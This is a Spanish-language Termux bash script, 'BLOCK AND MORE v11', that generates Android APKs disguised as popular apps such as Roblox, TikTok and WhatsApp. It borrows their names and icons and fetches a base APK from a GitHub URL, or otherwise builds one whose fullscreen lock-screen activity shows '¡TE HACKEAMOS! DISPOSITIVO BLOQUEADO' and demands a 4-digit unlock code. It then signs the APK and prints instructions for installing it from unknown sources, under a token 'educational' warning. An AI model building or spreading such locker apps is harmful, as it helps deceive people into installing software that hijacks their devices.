#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v11 ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# ICONOS DE APPS
# ============================================
get_icon_url() {
    case "$1" in
        "Roblox") echo "https://img.icons8.com/color/512/roblox.png" ;;
        "Free Fire") echo "https://img.icons8.com/color/512/free-fire.png" ;;
        "TikTok") echo "https://img.icons8.com/color/512/tiktok.png" ;;
        "Instagram") echo "https://img.icons8.com/color/512/instagram-new.png" ;;
        "Facebook") echo "https://img.icons8.com/color/512/facebook-new.png" ;;
        "WhatsApp") echo "https://img.icons8.com/color/512/whatsapp.png" ;;
        "YouTube") echo "https://img.icons8.com/color/512/youtube-play.png" ;;
        "Minecraft") echo "https://img.icons8.com/color/512/minecraft.png" ;;
        "PUBG Mobile") echo "https://img.icons8.com/color/512/pubg.png" ;;
        "Clash of Clans") echo "https://img.icons8.com/color/512/clash-of-clans.png" ;;
        "Spotify") echo "https://img.icons8.com/color/512/spotify.png" ;;
        "Netflix") echo "https://img.icons8.com/color/512/netflix.png" ;;
        *) echo "" ;;
    esac
}

# ============================================
# FUNCIÓN: MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: GENERAR APK (MÉTODO INFALIBLE)
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"

    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"

    # Instalar herramientas
    pkg install apktool apksigner wget zip -y > /dev/null 2>&1

    # Crear carpeta temporal
    mkdir -p ~/block_temp
    cd ~/block_temp

    # ============================================
    # PASO 1: DESCARGAR APK BASE REAL
    # ============================================
    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
    
    # Descargar APK de calculadora simple (funciona como base)
    BASE_URL="https://raw.githubusercontent.com/emanuelyoan470/Mi-herramienta/main/base.apk"
    wget -q -O base.apk "$BASE_URL" 2>/dev/null
    
    # Si falla, crear una APK manualmente
    if [ ! -f "base.apk" ] || [ ! -s "base.apk" ]; then
        echo -e "${AMARILLO}[!] No se pudo descargar, creando APK manual...${NC}"
        
        # Crear APK simple con estructura mínima
        mkdir -p base_apk
        cd base_apk
        
        # AndroidManifest.xml
        cat > AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.app"
    android:versionCode="1"
    android:versionName="1.0">
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

        # Layout
        mkdir -p res/layout
        cat > res/layout/main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#CC0000"
    android:padding="20dp">
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="⚠️"
        android:textSize="70sp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="¡TE HACKEAMOS!"
        android:textColor="#FFFFFF"
        android:textSize="32sp"
        android:textStyle="bold"
        android:layout_marginTop="10dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="🔒 DISPOSITIVO BLOQUEADO"
        android:textColor="#FFFF00"
        android:textSize="18sp"
        android:layout_marginTop="5dp" />
    
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Ingresa el código de 4 dígitos"
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:layout_marginTop="20dp"
        android:layout_marginBottom="20dp" />
    
    <EditText
        android:id="@+id/codigo"
        android:layout_width="200dp"
        android:layout_height="50dp"
        android:background="#FFFFFF"
        android:textColor="#000000"
        android:textSize="24sp"
        android:gravity="center"
        android:inputType="number"
        android:maxLength="4" />
    
    <Button
        android:id="@+id/desbloquear"
        android:layout_width="200dp"
        android:layout_height="50dp"
        android:text="🔓 DESBLOQUEAR"
        android:textColor="#FFFFFF"
        android:textSize="16sp"
        android:textStyle="bold"
        android:background="#FF0000"
        android:layout_marginTop="15dp" />
    
    <TextView
        android:id="@+id/error"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFF00"
        android:textSize="14sp"
        android:layout_marginTop="10dp" />
        
    <TextView
        android:id="@+id/timer"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:layout_marginTop="5dp" />
        
</LinearLayout>
EOF

        # Strings
        mkdir -p res/values
        cat > res/values/strings.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Block App</string>
</resources>
EOF

        cd ..
        
        # Empaquetar con apktool
        apktool b base_apk -o base.apk 2>/dev/null
        
        if [ ! -f "base.apk" ]; then
            cd base_apk
            zip -r ../base.apk * 2>/dev/null
            cd ..
        fi
    fi

    # ============================================
    # PASO 2: DECOMPILAR Y MODIFICAR
    # ============================================
    if [ -f "base.apk" ] && [ -s "base.apk" ]; then
        echo -e "${AMARILLO}[*] Decompilando APK...${NC}"
        apktool d base.apk -o decoded 2>/dev/null
        
        if [ -d "decoded" ]; then
            echo -e "${AMARILLO}[*] Personalizando APK...${NC}"
            
            # Cambiar nombre de la app
            find decoded -name "AndroidManifest.xml" -exec sed -i "s/Block App/$app/g" {} \;
            find decoded -name "strings.xml" -exec sed -i "s/Block App/$app/g" {} \;
            
            # Cambiar código de desbloqueo (buscar en smali)
            find decoded -name "*.smali" -exec sed -i "s/1234/$codigo/g" {} \;
            
            # Descargar icono
            echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"
            ICON_URL=$(get_icon_url "$app")
            wget -q -O icon.png "$ICON_URL" 2>/dev/null
            
            if [ ! -f "icon.png" ]; then
                echo -e "${AMARILLO}[!] Usando icono genérico...${NC}"
                echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
            fi
            
            # Copiar icono a todas las carpetas
            find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
            find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
            rm -f icon.png
            
            # Recompilar
            echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
            apktool b decoded -o app_unsigned.apk 2>/dev/null
        fi
    fi

    # Si falla, intentar método alternativo
    if [ ! -f "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Usando método alternativo...${NC}"
        if [ -d "decoded" ]; then
            cd decoded
            zip -r ../app_unsigned.apk * 2>/dev/null
            cd ..
        fi
    fi

    # ============================================
    # PASO 3: FIRMAR LA APK
    # ============================================
    if [ -f "app_unsigned.apk" ] && [ -s "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Firmando APK...${NC}"
        
        # Generar keystore si no existe
        if [ ! -f ~/debug.keystore ]; then
            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
        fi
        
        # Firmar
        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
        
        if [ ! -f "${app}_block.apk" ]; then
            mv app_unsigned.apk "${app}_block.apk"
        fi
    fi

    # ============================================
    # PASO 4: MOVER A DESCARGA
    # ============================================
    if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp

        clear
        echo -e "${CYAN}==================================================${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
        echo -e "${CYAN}==================================================${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
        echo -e "\n${VERDE}📱 INSTRUCCIONES:${NC}"
        echo -e "  1. Activa 'Instalar apps de fuentes desconocidas'"
        echo -e "  2. Abre el archivo desde Descargas"
        echo -e "  3. Toca 'Instalar'"
        echo -e "  4. Al abrir, ingresa: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
        echo -e "${AMARILLO}[*] Asegúrate de tener conexión a internet y reinicia Termux.${NC}"
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v11 ]${NC}\n"

    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty

    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"

        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done

        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
